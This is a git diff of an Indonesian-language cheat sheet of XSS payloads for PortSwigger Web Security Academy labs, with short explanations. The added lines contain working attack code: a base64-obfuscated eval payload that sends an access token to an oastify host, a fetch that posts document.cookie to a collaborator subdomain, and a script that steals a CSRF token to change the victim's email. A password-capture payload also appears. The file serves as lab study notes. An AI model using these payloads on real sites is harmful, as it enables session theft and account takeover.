@@ -41,6 +41,8 @@
 <iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
 ```
 **Penjelasan** : sink $() memungkinkan juga untuk menyimpan object ke dalam DOM, dengan memanfaatkan event handler `hashchange`, sehingga penyerang hanya perlu mencoba untuk mentrigger event handler hashchange tersebut, dimana dengan bantuan event `onload="this.src+='<img src=1 onerror=print()>'"` akan mentrigger hashchange
+**Reference** :
+https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md
 
 ### Reflected XSS into attribute with angle brackets HTML-encoded
 
@@ -135,7 +137,11 @@ link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan 
 ```html
 <script>var i=new Image(); i.src="http://z99oqbqbw51wp1w0xw0fu7uau10soic7.oastify.com/?cookie="+btoa(document.cookie);</script>
 
-<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL2l0ZnNmZGRrdnV5b3FnZW5sYWd0ZGluenZxMWhwN2R3Lm9hc3RpZnkuY29tLz8iK2RvY3VtZW50LmNvb2tpZSwgdHJ1ZSk7Cnhoci5zZW5kKCk7'))</script>
+<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL3M2ejZqZGxydThoOHE2ajBlYWczeHhia3RiejJuN2J3Lm9hc3RpZnkuY29tLz8iK2xvY2FsU3RvcmFnZS5nZXRJdGVtKCdhY2Nlc3NfdG9rZW4nKSwgdHJ1ZSk7Cnhoci5zZW5kKCk7='))</script>
+
+<script> 
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); 
+</script>
 ```
 
 ### Exploiting cross-site scripting to capture passwords
@@ -145,3 +151,9 @@ link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan 
 <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
 ```
 
+### Exploiting XSS to bypass CSRF defenses
+**Payload** :
+```html
+<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
+```
+### CheatSheet Practice Exam
